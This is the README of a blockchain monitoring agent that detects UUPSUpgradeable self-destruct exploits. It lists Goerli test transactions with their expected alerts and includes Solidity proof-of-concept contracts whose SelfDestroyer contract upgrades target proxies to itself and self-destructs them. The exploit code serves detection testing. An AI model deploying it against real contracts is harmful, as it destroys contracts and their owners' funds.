# UUPSUpgradeable Exploit Detection Agent

## Description

This agent detects exploits of the UUPSUpgradeable vulnerability that cause vulnerable contracts to self-destruct [post-mortem](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680)

## Supported Chains

Tested on:
- Ethereum
- Goerli

It should work on any other chain that supports ERC1967-style upgrades.

## Alerts

When it finds an `Upgraded(address)` event coming from a contract that was destroyed in the same block, this agent generates an `Exploit` alert with `Critical` severity. The alert metadata contains the addresses of the old implementation (victim) and the new implementation (attacker).

## Test Data

The agent behaviour can be verified with the following transactions on Goerli:

- [0xa969f9b0cc8b8530bd68486da27ffeaea3864bf1d31c1435d289bc7328484174](https://goerli.etherscan.io/tx/0xa969f9b0cc8b8530bd68486da27ffeaea3864bf1d31c1435d289bc7328484174) generated an `Upgraded` event but did not cause the source contract to self-destruc, so it should *not* trigger an alert
- [0x231b2a9f5710e780a9e8446cbb621210fa42cc94cbd144b36402d943284be096](https://goerli.etherscan.io/tx/0x231b2a9f5710e780a9e8446cbb621210fa42cc94cbd144b36402d943284be096) generated the `Upgraded` event and caused the source contract ([0xa3D62CD98A08b89adFF8dF7f78dAdB35710cec14](https://goerli.etherscan.io/address/0xa3d62cd98a08b89adff8df7f78dadb35710cec14)) to self-destruct, so it should trigger an alert
- [0x81be429b496486bc121cd392ef68afad3a683d9275cb1bb1afaa556e1c87c064](https://goerli.etherscan.io/tx/0x81be429b496486bc121cd392ef68afad3a683d9275cb1bb1afaa556e1c87c064) destroyed 2 separate contracts in a single transaction, so we expect 2 alerts to be generated

We expect the following results:

```
$ npm run tx 0xa969f9b0cc8b8530bd68486da27ffeaea3864bf1d31c1435d289bc7328484174

0 findings for transaction 0xa969f9b0cc8b8530bd68486da27ffeaea3864bf1d31c1435d289bc7328484174

$ npm run tx 0x231b2a9f5710e780a9e8446cbb621210fa42cc94cbd144b36402d943284be096

1 findings for transaction 0x231b2a9f5710e780a9e8446cbb621210fa42cc94cbd144b36402d943284be096 {
  "name": "UUPSUpgradeable Vulnerability Self-Destruct Exploit",
  "description": "Self-destructed implementation: 0xa3D62CD98A08b89adFF8dF7f78dAdB35710cec14",
  "alertId": "SUS-1",
  "protocol": "ethereum",
  "severity": "Critical",
  "type": "Exploit",
  "metadata": {
    "old_impl": "0xa3D62CD98A08b89adFF8dF7f78dAdB35710cec14",
    "new_impl": "0x1271Ea1e9D80d7F85Dce4fc31ed9105101f56850"
  }
}

$ npm run tx 0x81be429b496486bc121cd392ef68afad3a683d9275cb1bb1afaa556e1c87c064

2 findings for transaction 0x81be429b496486bc121cd392ef68afad3a683d9275cb1bb1afaa556e1c87c064 {
  "name": "UUPSUpgradeable Vulnerability Self-Destruct Exploit",
  "description": "Self-destructed implementation: 0x83982baBBA1b72a05622f9D829a3e7a796cA14dF",
  "alertId": "SUS-1",
  "protocol": "ethereum",
  "severity": "Critical",
  "type": "Exploit",
  "metadata": {
    "old_impl": "0x83982baBBA1b72a05622f9D829a3e7a796cA14dF",
    "new_impl": "0xBaEAB8ce7E4f89466E388C36d2aF9e1542ec87bB"
  }
},{
  "name": "UUPSUpgradeable Vulnerability Self-Destruct Exploit",
  "description": "Self-destructed implementation: 0x008b1762F5E8590bb94B9DbC8417b22Bc1c92f1D",
  "alertId": "SUS-1",
  "protocol": "ethereum",
  "severity": "Critical",
  "type": "Exploit",
  "metadata": {
    "old_impl": "0x008b1762F5E8590bb94B9DbC8417b22Bc1c92f1D",
    "new_impl": "0xBaEAB8ce7E4f89466E388C36d2aF9e1542ec87bB"
  }
}

```

## Proof of concept to generate new test data

There are 2 contracts in `src/sol_poc`:

- `PretendUUPSUpgradeable`: this contains the relevant parts of [ERC1967Upgrade](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.3/contracts/proxy/ERC1967/ERC1967Upgrade.sol). When called with `_upgradeToAndCall`, it generates an `Upgraded(newImplementation)` event and a `DELEGATECALL` to the new implementation
- `SelfDestroyer`: contains a single `receive()` function that acts as the migration function for the new implementation. The only thing it does is call `selfdestruct` in order to trigger the exploit.

To generate a transaction that would exhibit the sign of a successful attack:

1. deploy `PretendUUPSUpgradeable`
2. deploy ``SelfDestroyer``
3. call `PretendUUPSUpgradeable.upgradeToAndCall(selfDestroyerAddr, [], true)`
4. this will cause a `delegatecall` to `SelfDestroyer` with empty calldata, hence the call to the `receive()` function

It may be necessary to increase the gas limit manually in order for the self-destruction to be successful.

The code of the PoC contracts is added below.

### PretendUUPSUpgradeable.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

contract PretendUUPSUpgradeable {
    /**
     * @dev Emitted when the implementation is upgraded.
     */
    event Upgraded(address indexed implementation);

    /**
     * @dev Stores a new address in the EIP1967 implementation slot.
     */
    function _setImplementation(address newImplementation) private {
        // Do nothing. This is a pretend upgradeable.
    }

    /**
     * @dev Perform implementation upgrade
     *
     * Emits an {Upgraded} event.
     */
    function _upgradeTo(address newImplementation) internal {
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
    }

    /**
     * @dev Perform implementation upgrade with additional setup call.
     *
     * Emits an {Upgraded} event.
     */
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data,
        bool forceCall
    ) public {
        _upgradeTo(newImplementation);
        if (data.length > 0 || forceCall) {
            newImplementation.delegatecall(data);
        }
    }
}
```

### SelfDestroyer.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface Upgradeable {
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data,
        bool forceCall
    ) external;
}

contract SelfDestroyer {
    /**
     * For maximum laziness, we just call self-destruct in the receive() function
     * so that we can trigger the attack with empty calldata
     */
    receive() external payable {
        selfdestruct(payable(msg.sender));
    }

    function destroyMany(Upgradeable[] calldata contracts) external {
        for (uint i = 0; i < contracts.length; i++) {
            contracts[i].upgradeToAndCall(address(this), "", true);
        }
    }
}
```